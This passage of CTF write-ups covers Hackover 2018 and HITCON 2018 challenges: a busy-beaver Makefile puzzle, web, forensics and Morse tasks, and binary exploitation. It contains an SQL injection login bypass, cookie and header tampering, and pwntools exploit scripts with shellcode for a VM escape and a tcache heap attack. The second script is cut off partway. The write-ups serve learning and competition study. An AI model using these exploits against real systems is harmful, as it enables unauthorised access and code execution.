them, and checking if their prefix is `8c3c4df743a` – which would then decode into `hackover18{`. Given how large the actual target number is, this was a very futile effort. But, hindsight's 20/20!\n\n`$(call m,$(1))` appears multiple times, and we already know that it simply produces a default value if needed.\n\nAnd finally, the `e` subcall resulting in the first argument of `k`. It takes the potentially defaulted `state`, appends a single symbol from `data` based on `pos`, and finds that prefix in the `program`.\n\nEven without knowing `k` it might start to be more and more clear what this program is. It is a [Turing Machine](https://en.wikipedia.org/wiki/Turing_machine) simulator, with 3-bit (up to 8) states, 2 symbols, and `data` is its tape. Given how long it executes, we can also guess that it is a [Busy beaver](https://en.wikipedia.org/wiki/Busy_beaver), i.e. a Turing machine designed to run for as long as possible.\n\nFor the sake of completion, however, let's have a look at the functions referenced by `k`.\n\n```Makefile\nb=$(or $(if $(filter +,$(strip $(1))),$(2) +),$(if $(filter -,$(strip $(1))),$(wordlist 2,$(words $(2)),$(2))),$(if $(filter N,$(strip $(1))),$(2)))\nc=$(if $(word 1,$(1)),$(if $(word $(words $(1)),$(2)),$(2),$(2) -),- $(2))\nf=$(wordlist 7,$(words $(1)),$(1))\ng=$(call b,$(word 6,$(1)), $(2))\nh=$(wordlist 1,$(words $(wordlist 2,$(words $(2)),$(2))),$(3)) $(word 5,$(1)) $(wordlist $(words $(2) -),$(words $(3)),$(3))\ni=$(or $(call g,$(1),$(2)),+)\n\n# k($1 state spec, $2 state, $3 pos, $4 data, $5 program)\nk=$(call l,$(call f, $(1)),$(call i, $(1), $(3)),$(call c,$(call g, $(1), $(3)),$(call h, $(1), $(3), $(4))),$(5))\n```\n\n```Makefile\n# b($1 movement, $2 pos)\nb=$(or\n  $(if $(filter +,$(strip $(1))),$(2) +),\n  $(if $(filter -,$(strip $(1))),$(wordlist 2,$(words $(2)),$(2))),\n  $(if $(filter N,$(strip $(1))),$(2))\n)\n```\n\n`b` takes an argument `movement` that will always be either `+` or `-` and the tape position (unary number). If `movement` is `+`, a `+` is appended to the position - increment by 1. If `movement` is `-`, the first word of the position is removed - decrement by 1. There is a check for `movement` `N`, but it seems to be a red herring, since this can never happen.\n\n```Makefile\n# c($1 pos, $2 data)\nc=$(if $(word 1,$(1)),$(if $(word $(words $(1)),$(2)),$(2),$(2) -),- $(2))\n```\n\n`c` is a function to \"normalise\" the tape. Whenever `pos` becomes 0, it prepends a `-` to `data`, thereby extending it to the left (`pos` itself is then normalised in `i`). And whenever `pos` is larger than the length of `data`, a `+` is appended to `data`. Note that the latter comparison is done with `$(word $(words $(1)),$(2))`, which checks if the `pos`-th word exists in `data`. If neither happens, `data` is left intact and returned as-is.\n\n```Makefile\n# f($1 state spec)\nf=$(wordlist 7,$(words $(1)),$(1))\n```\n\n`f` takes one of the (space-separated) words from `program` and returns its 7th through last words. We'll see soon the significance of this.\n\n```Makefile\n# g($1 state spec, $2 pos)\ng=$(call b,$(word 6,$(1)), $(2))\n```\n\n`g` takes one of the (space-separated) words from `program` and updates the tape position `pos` based on its 6th word.\n\n```Makefile\n# h($1 state spec, $2 pos, $3 data)\nh=$(wordlist 1,$(words $(wordlist 2,$(words $(2)),$(2))),$(3)) \\\n  $(word 5,$(1)) \\\n  $(wordlist $(words $(2) -),$(words $(3)),$(3))\n```\n\n`h` is the function that actually takes care of writing symbols to the tape. It takes `data` and returns it in three chunks - all the `data` words (symbols) from beginning to `pos - 1`, then the 5th word of one of the (space-separated) words from `program`, then all the `data` words (symbols) from `pos + 1` to the end. A Python equivalent would be `data[:pos] ++ [symbol] ++ data[pos + 1:]`.\n\n```Makefile\n# i($1 state spec, $2 pos)\ni=$(or $(call g,$(1),$(2)),+)\n```\n\n`i` just wraps `g`, but if the output of `g` is empty (i.e. `pos == 0`), it returns `+` (i.e. `pos == 1`) instead. This is the other part of the position normalisation. If `pos` becomes zero, the tape is extended to the left (see `c` above), and `pos` is incremented to be one instead.\n\n```Makefile\n# k($1 state spec, $2 state, $3 pos, $4 data, $5 program)\nk=$(call l,\n\t$(call f, $(1)),\n\t$(call i, $(1), $(3)),\n\t$(call c,\n\t\t$(call g, $(1), $(3)),\n\t\t$(call h, $(1), $(3), $(4))\n\t),\n\t$(5)\n)\n```\n\nAnd finally `k`. This function always calls `l`, but it updates all of its arguments, except for the `program`, which never changes. Let's finally crack the `program` encoding, based on the functions we have just analysed. `program` contains 14 words, each of which is composed of 9 `+` / `-` symbols.\n\n```\n++--+++++\n++-+-+--+\n+++---++-\n++++-+-++\n--+-++-++\n--+++++--\n-++-+--+-\n-+++---++\n-+--+++-+\n-+-++-+++\n+-+-++++-\n+-++++-+-\n+---++---\n+--++-+--\n```\n\nAccording to the various ways these symbols are used, we can split these words into columns:\n\n```\n++- - + + +++\n++- + - + --+\n+++ - - - ++-\n+++ + - + -++\n--+ - + + -++\n--+ + + + +--\n-++ - + - -+-\n-++ + - - -++\n-+- - + + +-+\n-+- + + - +++\n+-+ - + + ++-\n+-+ + + + -+-\n+-- - + + ---\n+-- + + - +--\n```\n\nNote that the first column is always repated twice, with `-` then `+` in the second column. The last column contains only strings that can be found in the first column, with the exception of `---` (0, the halting state). The first column is 3 bits, hence it can express 8 different numbers, but only 7 states are present. Again, 0 is the halting state that is not described here.\n\nBased on the analysis, we can describe these columns and use decimal representations for the 3-bit ones:\n\n```\n(bits) 123        4         5      6           789\n  dec  cur state  cur tape  write  pos change  next state  dec\n    6  ++-        -         +      +           +++         7\n    6  ++-        +         -      +           --+         1\n    7  +++        -         -      -           ++-         6\n    7  +++        +         -      +           -++         3\n    1  --+        -         +      +           -++         3\n    1  --+        +         +      +           +--         4\n    3  -++        -         +      -           -+-         2\n    3  -++        +         -      -           -++         3\n    2  -+-        -         +      +           +-+         5\n    2  -+-        +         +      -           +++         7\n    5  +-+        -         +      +           ++-         6\n    5  +-+        +         +      +           -+-         2\n    4  +--        -         +      +           ---         0\n    4  +--        +         +      -           +--         4\n```\n\nOr in a more conventional notation, where the tuples represent (what to write, which way to move, which state to go to):\n\n| State | Current symbol: 0 | Current symbol: 1 |\n| --- | --- | --- |\n| 6 | (1, →, 7) | (0, →, 1) |\n| 7 | (0, ←, 6) | (0, →, 3) |\n| 1 | (1, →, 3) | (1, →, 4) |\n| 3 | (1, ←, 2) | (0, ←, 3) |\n| 2 | (1, →, 5) | (1, ←, 7) |\n| 5 | (1, →, 6) | (1, →, 2) |\n| 4 | (1, →, 0) | (1, ←, 4) |\n\nThe Turing machine works in steps on the tape. At each step, it looks at the symbol at the current position on the tape. Based on the current symbol and its current state, it writes a symbol to the tape, then moves either left or right, and finally switches to another state (may be the same state).\n\nThe starting state is `++-` (6), thanks to the `m` function.\n\nWe can also see that the only way to get to state `0`, the halting state, is from state `4`. State `4` itself does not modify the tape except for changing a single symbol just before halting, so it is basically superfluous. So in fact, this seems to be a 6-state busy beaver.\n\nNow that we know all about this Turing machine simulator, we have another problem: how to figure out its result. Busy beavers are *designed* to take as long as possible, and the record holder for a 6-state BB produces more than \"3.514 x⋅10^{18267}\" 1's on the tape. This obviously surpasses the memory capabilities of any computer.\n\nThe good news is that we do not need to simulate the machine directly, nor do we need to represent one symbol on the tape as one bit of real memory. Even though the busy beaver machines take unfathomable number of steps before halting, their behaviour is still modeled completely with a simple table, as seen above. So the patterns they produce on the tape are expansive, but not terribly complex. Instead of a billion ones, we can simply use a single symbol that say \"repeat 1 a billion times\", since the number itself, even if arbitrarily big, can still be represented in far less memory than the data.\n\nThis is where I was ~1 hour before the end of the CTF, in the process of writing a simulator for the BB machine. From what I have seen of its behaviour, my more efficient simulator would only need to compress long runs of ones and zeros, and long runs of the alternating `0 1 0 1 ...` pattern. Had I started earlier I might have finished the program, or perhaps had the much more practical realisation that \"somebody must have done this\".\n\nAs it turns out, there was a page on the Internet with an efficient BB simulator, though by chance it went offline shortly before the CTF. After the CTF ended, an admin pointed me to [an archived version of the site](http://web.archive.org/web/20160314012051/http://www.drb.insel.de/~heiner/BB/). This site contains [an awk script to run BB simulations](http://web.archive.org/web/20160305221928/http://www.drb.insel.de/~heiner/BB/bbsimtab.html#How), as well as [some record-holding BB machines](http://web.archive.org/web/20140717002127/http://www.drb.insel.de/~heiner/BB/bb-6list).\n\nAs mentioned above, the machine in this challenge has a superfluous state which simply adds 1 to the number of 1's on the tape. Taking the number of ones produced by one of the BB machines in the list (`Name = k`), adding 1 to it, and taking the SHA-256 sum of it:\n\n    $ echo \"2537699363594175843063 + 1\" \\\n      | bc \\\n      | shasum -a 256 \\\n      | python -c \"import sys; print ''.join([chr(ord(c) - d) for c,d in zip(sys.stdin.read(),[-48, 2, -48, -8, -59, -18, 1, -59, 3, -5, -26, -57, 53, 3, -43, -3, -41, -20, 1, -64, -65, -45, -71, -47, -16, -47, -38, -3, 46, -63, -54, 1, -49, 4, -51, -45, -61, -46, -13, -4, -65, -48, -55, -51, -38, -64, -50, -5, -65, 2, -54, -56, -1, -50, -28])])\"\n\nVery creative challenge, I wish I did not waste some of my hours!\n\n`hackover18{n0_beavers_were_h4rmed_gener4ting_this_fl4g}`\n\n## 100 Web / ez web ##\n\n**Description**\n\n> Easy web challenge in the slimmest possible design.... namely none.\n> \n> http://ez-web.ctf.hackover.de:8080\n\n**No files provided**\n\n**Solution**\n\nWe are presented with a simple \"under construction\" text, accompanied by a GIF that doesn't exist.\n\n```html\n<!DOCTYPE html>\n  <head>\n    <title>Under Construction</title>\n  </head>\n  <body>\n    <p><img src='/under_construction.gif' alt='under construction' /></p>\n  </body>\n</html>\n```\n\n`/flag.txt` doesn't exist, but we can check [`robots.txt`](https://en.wikipedia.org/wiki/Robots_exclusion_standard):\n\n```\nUser-agent: *\nDisallow: /flag/\n```\n\nThe `/flag/` directory contains `flag.txt`, but we are not allowed to see it:\n\n```html\n<!DOCTYPE html>\n\t<head>\n\t\t<title>Restricted Access</title>\n\t</head>\n\t<body>\n\t\t<p>You do not have permission to enter this Area. A mail has been sent to our Admins.<br/>You shall be arrested shortly.</p>\n\t</body>\n</html>\n```\n\nBut the server simply sent us a cookie `isAllowed=false`, so changing that to `true`, we can see the flag.\n\n`hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}`\n\n## 100 Web / i-love-heddha ##\n\n**Description**\n\n> A continuation of the Ez-Web challenge. enjoy\n> \n> 207.154.226.40:8080\n\n**No files provided**\n\n**Solution**\n\nThe initial webpage is identical to that of [`ez web`](#100-web--ez-web). `robots.txt` still disallows `/flag/` and the directory listing in `/flag/` only contains `flag.txt`. If we click the link from the directory listing, however, we get a 404 - the link actually points to `/flag/flga.txt`.\n\nWe can fix the link to `/flag/flag.txt`, and we get \"Bad luck buddy\". Once again we set our `isAllowed` cookie to `true`.\n\n```html\nYou are using the wrong browser, 'Builder browser 1.0.1' is required\n```\n\nAfter this [`User-Agent`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) check, we get a [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) check and finally we get a [Base64](https://en.wikipedia.org/wiki/Base64) string.\n\n    $ curl --silent \\\n      -b \"isAllowed=true\" \\\n      -A \"Builder browser 1.0.1\" \\\n      -H \"Referer: hackover.18\" \\\n      \"http://207.154.226.40:8080/flag/flag.txt\" | base64 -D\n\n`hackover18{4ngryW3bS3rv3rS4ysN0}`\n\n## 416 Web / who knows john dows? ##\n\n**Description**\n\n> Howdy mate! Just login and hand out the flag, aye! You can find on [h18johndoe](https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb) has all you need!\n> \n> `http://yo-know-john-dow.ctf.hackover.de:4567/login`\n> \n> alternative: `46.101.157.142:4567/login`\n\n**No files provided**\n\n**Solution**\n\nWe get a simple login screen, but no way to register:\n\n![](screens/do-you-know-john-dows.png)\n\nFirst we need a username. `h18johndoe` from the description doesn't work. Well, we can have a look at the link from the description, which seems to show the source code for back end of this website:\n\n```ruby\nclass UserRepo\n\n  def initialize(database)\n    @database = database\n    @users = database[:users]\n  end\n\n  def login(identification, password)\n    hashed_input_password = hash(password)\n    query = \"select id, phone, email from users where email = '#{identification}' and password_digest = '#{hashed_input_password}' limit 1\"\n    puts \"SQL executing: '#{query}'\"\n    @database[query].first if user_exists?(identification)\n  end\n\n  def user_exists?(identification)\n    !get_user_by_identification(identification).nil?\n  end\n\n  private\n\n  def get_user_by_identification(identification)\n    @users.where(phone: identification).or(email: identification).first\n  end\n\n  def hash(password)\n    password.reverse\n  end\n\nend\n```\n\nThe `login` method has a clear SQL injection, since the password \"hashing\" just reverses the input we give it, without any sanitising. Before `login` is called however, we need to pass the `user_exists?` check, which seems to use prepared statements. So we still need an existing e-mail.\n\nThe file above has commits from two users, `h18johndoe` and `john1234`. GitHub doesn't seem to show e-mail addresses of users, but if we clone the repo and check the commit log, we can see the e-mails:\n\n```\n$ git log\ncommit b26aed283d56c65845b02957a11d90bc091ac35a\nAuthor: John Doe <angelo_muh@yahoo.org>\nDate:   Tue Oct 2 23:55:57 2018 +0200\n\n    Add login method\n\ncommit 5383fb4179f1aec972c5f2cc956a0fee07af353a\nAuthor: John Doe <jamez@hemail.com>\nDate:   Tue Oct 2 23:04:13 2018 +0200\n\n    Add methods\n\ncommit 2d3e1dc0c5712efd9a0c7a13d2f0a8faaf51153c\nAuthor: John Doe <john_doe@gmail.com>\nDate:   Tue Oct 2 23:02:26 2018 +0200\n\n    Add dependency injection for database\n\ncommit 3ec70acbf846037458c93e8d0cb79a6daac98515\nAuthor: John Doe <john_doe@notes.h18>\nDate:   Tue Oct 2 23:01:30 2018 +0200\n\n    Add user repo class and file\n```\n\nAnd the last one (earliest commit chronologically) is actually the correct e-mail address: `john_doe@notes.h18`. After entering this e-mail we get asked for the password, and this is where we can do the SQL injection, since we don't know the user's password.\n\nWe only need to login, so we can do an extremely simple injection:\n\n    input:   'or''=='\n    reverse: '==''ro'\n    full query after injection and re-reverse:\n      select id, phone, email from users where email = 'john_doe@notes.h18'\n      and password_digest = ''or '' == '' limit 1\n\n`hackover18{I_KN0W_H4W_70_STALK_2018}`\n\n## 100 Forensics / I AM MANY ##\n\n**No description**\n\n**Files provided**\n\n - [`hackover.png`](files/i-am-many.png)\n\n**Solution**\n\nWe can open the PNG and check for LSB-hidden text, partial transparency, etc, but it seems innocent enough.\n\n![](files/i-am-many.png)\n\nLooking through the file in a Hex Editor, we can see the individual chunks making up the file. There is a `sBIT` chunk, but it seems to have no effect, since it specifies 8 significant bits for each channel anyway, i.e. no different from what the data holds.\n\nThinking about the title, we can notice *many* `IDAT` chunks, although this is quite normal, since it allows PNGs to be loaded and decoded progressively. The first unusual thing I noticed was that the sizes of the `IDAT` chunks were weird - the first one was 4590 bytes, the next couple 8192 bytes. Usually if a file is encoded with a regular PNG encoder, the chunks all have the same size except for the last one. Then I realised why - all the chunks except for the first actually belonged to a different PNG file.\n\n    $ xxd hackover.png | tail -n +289 | head -n 5\n    0001200: 9cc4 60a6 a929 171a af7c 7f3c 073c 073c  ..`..)...|.<.<.<\n    0001210: 073c 073c 073c 073c 073c 073c 074a 0507  .<.<.<.<.<.<.J..\n    0001220: fe07 f64e 9dc0 9c82 68bd 0000 0000 4945  ...N....h.....IE\n    0001230: 4e44 ae42 6082 8950 4e47 0d0a 1a0a 0000  ND.B`..PNG......\n    0001240: 000d 4948 4452 0000 0320 0000 004c 0806  ..IHDR... ...L..\n\nSo extracting everything from offset `4662` onwards into a separate file:\n\n    $ dd if=hackover.png of=flag.png bs=1 skip=4662\n\nWe get the flag:\n\n![](files/i-am-many2.png)\n\n`hackover18{different_Fl4g_for_3arly_ch33tahz}`\n\n## 337 Forensics / UnbreakMyStart ##\n\n**Description**\n\n> https://www.youtube.com/watch?v=p2Rch6WvPJE\n\n**Files provided**\n\n - [`unbreak_my_start.tar.xz`](files/unbreak_my_start.tar.xz)\n\n**Solution**\n\n    $ xxd unbreak_my_start.tar.xz\n    0000000: 504b 0304 1400 0800 0800 04e6 d6b4 4602  PK............F.\n    0000010: 0021 0116 0000 0074 2fe5 a3e0 07ff 007d  .!.....t/......}\n    0000020: 5d00 331b 0847 5472 2320 a8d7 45d4 9ae8  ].3..GTr# ..E...\n    0000030: 3a57 139f 493f c634 8905 8c4f 0bc6 3b67  :W..I?.4...O..;g\n    0000040: 7028 1a35 f195 abb0 2e26 666d 8c92 da43  p(.5.....&fm...C\n    0000050: 11e1 10ac 4496 e2ed 36cf 9c99 afe6 5a8e  ....D...6.....Z.\n    0000060: 311e cb99 f4be 6dca 943c 4410 8873 428a  1.....m..<D..sB.\n    0000070: 7c17 f47a d17d 7808 b7e4 22b8 ec19 9275  |..z.}x...\"....u\n    0000080: 5073 0c34 5f9e 14ac 1986 d378 7b79 9f87  Ps.4_......x{y..\n    0000090: 0623 7369 4372 19da 6e33 0217 7f8d 0000  .#siCr..n3......\n    00000a0: 0000 001c 0f1d febd b436 8c00 0199 0180  .........6......\n    00000b0: 1000 00ad af23 35b1 c467 fb02 0000 0000  .....#5..g......\n    00000c0: 0459 5a                                  .YZ\n\nWe can see in the hexdump that the file ends in `YZ`, the normal footer for `xz` archives, but the header is `PK`, as seen in `zip` archives. Since the challenge says to unbreak its start, we can only assume that this should be a valid `xz` file, so the beginning is wrong.\n\nFirst of all, we should find a specification for the format. Luckily, `xz` is [well documented](https://tukaani.org/xz/xz-file-format-1.0.4.txt). The relevant sections are the `2.1.1. Stream Header` and `2.1.2. Stream Footer`.\n\nThe header should be:\n\n - Magic bytes - `0xFD, \"7xXZ\", 0x00`\n - Stream flags - should be identical to the flags in the footer, i.e. `0x00 0x04`\n - [CRC32](https://en.wikipedia.org/wiki/Cyclic_redundancy_check) - calculated from the Stream flags only, `0xE6 0xD6 0xB4 0x46`\n\nTo calculate the CRC32 in the terminal (then change endianness of result):\n\n    $ (printf \"obase=16;ibase=10;\"; printf \"\\x00\\x04\" | cksum -o 3 | cut -d \" \" -f 1) | bc\n    46B4D6E6\n\nAs it turns out, the correct CRC32 is already in the file, at offset `0x0B`. Let's try to replace the first 11 bytes of the file with our constructed header:\n\n    $ dd if=unbreak_my_start.tar.xz of=trimmed.bin bs=1 skip=11\n    184+0 records in\n    184+0 records out\n    184 bytes transferred in 0.000920 secs (199988 bytes/sec)\n    $ (printf \"\\xFD7zXZ\\x00\\x00\\x04\"; cat trimmed.bin) > fixed.tar.xz\n    $ xz -d fixed.tar.xz\n    $ tar zxvf fixed.tar\n    x flag.txt\n\n`hackover18{U_f0und_th3_B3st_V3rs10n}`\n\n## 100 Misc / Hummel Hummel - Fart Fart ##\n\n**Description**\n\n> There is no \"hackover18{*}\" in the word. the solution has to be inserted as hackover18{mysolution}.\n> \n> Format: all lowercase, words split by space, no numbers\n\n**Files provided**\n\n - [`challenge.mp4`](files/hummel.mp4)\n\n**Solution**\n\nWe get an ... interesting video with a farting unicorn. First of all we can convert it to sound only, since the video is actually irrelevant:\n\n    $ ffmpeg -i hummel.mp4 hummel.mp3\n\nThen we can open it e.g. in Soundbooth:\n\n![](screens/hummel.png)\n\nThe noises seem too well timed and systematic. In fact, it is easy to see that there are clearly short ones and long ones, and there are longer pauses every now and then. So it is [Morse code](https://en.wikipedia.org/wiki/Morse_code)!\n\nTranscribing the noises, we get:\n\n    .--. --- . - .-. -.-- / .. -. ... .--. .. .-. . -.. / -... -.-- / -... .- -.- . -.. / -... . .- -. .....\n\nWhich translates to:\n\n    poetry inspired by baked bean5\n\nThis didn't get accepted, but after messaging the admin the last `5` should have been an `s`, so we got our flag.\n\n`hackover18{poetry inspired by baked beans}`\n", "timestamp": "2025-10-24T11:39:11.610174"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-10-20-HITCON-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-10-20-HITCON-CTF/README.md", "content": "## Abyss 1\n\nThis challenge is the VM escape from custom VM to user level arbitrary code execution. After some reverse engineering, we can find that there are vulnerabilities in `swap` and `rotate`, although I have used the `swap` only.\n\n```c\n_DWORD *swap_()\n{\n  int v0; // ST04_4\n  _DWORD *result; // rax\n\n  v0 = stack[sp_nxt - 1];\n  stack[sp_nxt - 1] = stack[sp_nxt - 2];\n  result = stack;\n  stack[sp_nxt - 2] = v0;\n  return result;\n}\n```\n\nIt is obvious that the value of `sp_nxt` is not checked, so if `sp_nxt` is 1, it will swap `stack[0]` and `stack[-1]`, and if we look at the memory layout, we can find that `stack[-1]` is exactly `sp_nxt`, which means that we can control the stack pointer to achieve arbitrary `read/write`.\n\nThe idea is to add a constant offset to the got table entry of the an uncalled function, such as `write`, which points to the program address(PLT entry) instead of libc, because it is not dynamically resolved yet. In this way, we can manipulate the function pointer to anywhere within the program image, including the `store` global array. Therefore, according to the hint, we can write the shellcode into that array, and let `write` to point to that array, and call the write function, to get arbitrary code execution.\n\nHowever, when I was inspecting the address in the got table with `writed` VM instruction, I found a tricky part, which got me stuck for many hours. If you run user program directly(`./user.elf`) in Linux, the program address will begin as `0x5x`, and the libc address will begin as `0x7f`; but in this customed OS, they both begin as `0x7f`, which misled me initially and made me think that there is no dynamic resolution but it instead would load the libc addresses to got table when the program begins. The reason is probably that it inits the program using `ld.so.2 ./user.elf`, and if you do this in Linux, the program address will begin as `0x7f` too.\n\nIn addition, in the customed OS, the address of `ld` begins with `0x5x`, but if you run that command in Linux, the `ld` will begin as `0x7f`, which is quite different.\n\nFinally, we need to decide what code to execute in order to get the flag, so we need to do some reversing for kernel first. After some reversing, we can find that the `syscall` table in kernel is `0x4020`, and so if we look at the `open` function:\n\n```c\n__int64 __fastcall open(const char *a1)\n{\n  unsigned int v1; // ebp\n  char *v2; // rax\n  __int64 v3; // rbx\n  signed __int64 v4; // rax\n\n  v1 = -14;\n  if ( !(unsigned int)sub_FFF() )\n    return v1;\n  v1 = -12;\n  v2 = strdup(a1);\n  v3 = (__int64)v2;\n  if ( !v2 )\n    return v1;\n  if ( (unsigned int)strcmp((__int64)v2, \"ld.so.2\")\n    && (unsigned int)strcmp(v3, \"/lib/x86_64-linux-gnu/libc.so.6\")\n    && (unsigned int)strcmp(v3, \"/proc/sys/kernel/osrelease\")\n    && (unsigned int)strcmp(v3, \"/etc/ld.so.cache\")\n    && (unsigned int)strcmp(v3, \"./user.elf\")\n    && (v1 = -2, (unsigned int)strcmp(v3, \"flag\")) )\n  {\n    return v1;\n  }\n  v4 = sub_1183(v3);\n  v1 = sub_E7E(v4);\n  sub_1577(v3);\n  return v1;\n}\n```\n\nIt is probably suggesting that the only files you can open are the files listed above, which include the flag, so the shellcode should just be `open(\"flag\", 0)`, `read(fd, buf, 100)`, and `write(1, buf, 100)`.\n\nThe exp:\n\n```python\nfrom pwn import *\n\ng_local=False\ncontext.log_level='debug'\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\nstore_idx = 0\n\nif g_local:\n\tsh = process(['./hypervisor.elf','kernel.bin','ld.so.2','./user.elf'])#env={'LD_PRELOAD':'./libc.so.6'}\n\t#sh = process(['ld.so.2', './user.elf'])\n\tONE_GADGET_OFF = 0x4526a\n\tUNSORTED_OFF = 0x3c4b78\n\tgdb.attach(sh)\nelse:\n\tONE_GADGET_OFF = 0x4526a\n\tUNSORTED_OFF = 0x3c4b78\n\tsh = remote(\"35.200.23.198\", 31733)\n\t#ONE_GADGET_OFF = 0x4557a\n\ndef get_qword():\n\thigh = int(sh.recvuntil(\"\\n\")) & 0xffffffff\n\tlow = int(sh.recvuntil(\"\\n\")) & 0xffffffff\n\treturn (high << 0x20) + low\n\n\ndef write():\n\treturn \"\\x2c\"\ndef store():\n\treturn \"\\x3a\"\ndef fetch():\n\treturn \"\\x3b\"\ndef push(imm):\n\treturn str(imm) + \"\\x01\"\ndef writed():\n\treturn \"\\x2e\"\ndef rot():\n\treturn \"\\x5c\"\ndef add():\n\treturn \"\\x2b\"\n\nasmcode = \"push rbx\\n\"\nasmcode += \"mov rax,0x67616c66\\n\" #flag\nasmcode += \"push rax\\n\"\nasmcode += \"mov rdi,rsp\\n\"\nasmcode += \"xor rsi,rsi\\n\"\nasmcode += \"mov rax,2\\n\"\nasmcode += \"syscall\\n\" #open\nasmcode += \"mov rdi,rax\\n\"\nasmcode += \"call next\\n\"\nasmcode += \"next: pop rbx\\n\"\nasmcode += \"add rbx,0x300\\n\"\nasmcode += \"mov rsi,rbx\\n\"\nasmcode += \"mov rdx,100\\n\"\nasmcode += \"xor rax,rax\\n\"\nasmcode += \"syscall\\n\" #read\nasmcode += \"mov rsi,rbx\\n\"\nasmcode += \"mov rdi,1\\n\"\nasmcode += \"mov rdx,100\\n\"\nasmcode += \"mov rax,1\\n\"\nasmcode += \"syscall\\n\" #write\nasmcode += \"pop rbx\\n\"\nasmcode += \"pop rbx\\n\"\nasmcode += \"ret\\n\"\n\nprint len(asmcode)\nshellcode = asm(asmcode, arch='amd64')\n\ncodelen = len(shellcode)\n\nsh.recvuntil(\" choice but keep going down.\\n\") + \"\\x90\"\n\nvmcode = \"\"\n\nfor i in xrange(0,codelen/4):\n\tvmcode += push(u32(shellcode[i*4:i*4+4]))\n\tvmcode += push(i)\n\tvmcode += store()\n\nvmcode += str(((0x202028 - 0x2020A4) / 4) & 0xffffffff)\nvmcode += rot()\n#vmcode += writed() * (0x98/8) * 2\nidx = codelen/4\nvmcode += push(idx)\nvmcode += store() #store high dword of write\n\nvmcode += push(0x2034A8 - 0x796)\nvmcode += add()\n\nvmcode += push(idx)\nvmcode += fetch()\n\nvmcode += write()\n\nsh.send(vmcode + \"\\n\")\n\n# for x in xrange(0,(0x98/8)):\n# \tprint hex(get_qword())\n\n#0x17e50\n\nsh.interactive()\n```\n\n## children tcache\n\nMy approach is not so elegant, which might not be the intended solution, so please don't criticize too harshly if you don't like it. :\\)\n\nThe vulnerability is not so obvious at the first glance, but as you think about it again, it is not hard either.\n\n```c\n//in the add function\ndest = (char *)malloc(size);\nif ( !dest )\n  exit(-1);\nprintf(\"Data:\");\nreadstr(s, size);\nstrcpy(dest, s);\n// null byte off by one, because '\\0' will be added after string\n```\n\nWe can just use null byte poisoning. But when a chunk is freed, `memset((void *)pbufs[v1], 0xDA, sizes[v1]);` will be executed first, which will overwrite all of the data in the chunk. For [null byte poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/poison_null_byte.c), we need to fake a `prev_size` to pass a check, but unfortunately we cannot do so due to such `memset` before `free`.\n\nWhat I was thinking about is to construct a `0xda11` unsorted bin, and construct a `0xda00` as the `prev_size` by writing `0x00`s using null byte off by one. Then after overflowing, the size of unsorted bin becomes `0xda00`, which matches the `prev_size` exactly.\n\nThere are few points to note in this exploitation method: firstly, if there is a unsorted bin with size `0x4b0`, `malloc(0x490)` will also get you the whole chunk instead of seperating it into 2 chunks, because `0x10` chunk simply does not exist, which can enable us to construct `0xda00` at the end of the chunk; secondly, because the TCP package has the maximum size, do not send data with size larger than `0x500`, or else the `read` function will return even though the data are not read completely.\n\nAfter obtaining the overlaped chunk using null byte poisoning, we can leak the libc address easily as usual, and rewrite the `fd` of a tcache chunk to enable the arbitrary chunk allocation. Different from fastbin, we don't need to fake the header, which is much easier. Also, the max index is 9, so the index is quite not enough. The reason is that we need to allocate about 7 times to get a `0xda00` chunk, given the maximum `malloc` size allowance being `0x2000`, but fortunately, we can exploit it with such maximum index exactly.\n\nThe exp:\n\n```python\nfrom pwn import *\n\ng_local=False\ncontext.log_level='debug'\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nUNSORTED_OFF = 0x3ebca0\nif g_local:\n\tsh = process('./children_tcache')#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"54.178.132.125\", 8763)\n\t#ONE_GADGET_OFF = 0x4557a\n\ndef add(size, data):\n\tsh.send(\"1\\x00\")\n\tsh.recvuntil(\"Size:\")\n\tsh.send(str(size) + \"\\x00\")\n\tsh.recvuntil(\"Data:\")\n\tsh.send(data)\n\tsh.recvuntil(\"Your choice: \")\n\ndef dele(idx):\n\tsh.send(\"3\\x00\")\n\tsh.recvuntil(\"Index:\")\n\tsh.send(str(idx) + \"\\x00\")\n\tsh.recvuntil(\"Your choice: \")\n\ndef show(idx):\n\tsh.send(\"2\\x00\")\n\tsh.recvuntil(\"Index:\")\n\tsh.send(str(idx) + \"\\x00\")\n\tret = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\"Your choice: \")\n\treturn ret[:len(ret)-1]\n\nfor i in xrange(0,6):\n\tadd(0x2000, \"ab\") #0-5\nadd(0x2000-0x250, \"ab\")\n\nadd(0x1010, \"c\") #7\nfor i in xrange(0,7):\n\tdele(i)\n# hex(0xe070-0xda10) = 0x660\n\nadd(0x400, \"a\") #0\n#0xda11 unsorted\n\nfor i in xrange(1,7):\n\tadd(0x2000, \"bs\") #1-6\n#0x19b1 unsorted\n\nadd(0x14F0, \"bn\") #8\n#0x4b1 unsorted\nfor i in xrange(0,6):\n\tadd(0x497 - i, \"b\".ljust(0x497 - i, \"n\")) #9\n\t#will still get the 0x4b1 size chunk, because there is no 0x10 chunk\n\tdele(9)\nadd(0x490, \"b\".ljust(0x490, \"n\")) #9\n#0xda00 prevsize being constructed\n\ndele(8) #delete 8 first to prevent top chunk consolidate\ndele(7)\nadd(0x2000, \"c1\") #7\nadd(0x2000, \"pad\") #8\ndele(9)\n\nfor i in xrange(1,7):\n\tdele(i)\n#0xda11 unsorted, and x/4gx 0x8b0+0xda00 is\n# 0x000000000000da00\t0xdadadadadadadada\n# 0x000000000000da10\t0x0000000000000510\n\ndele(0) #a\nadd(0x408, \"a\" * 0x408) #0, trigger vuln!\n#0xda00 unsorted\n\n# 1-6 9 empty\n\nadd(0x500, \"b1\") #1\nadd(0x1800, \"b2\") #2\nadd(0x200, \"b3\") #3\n\ndele(3) 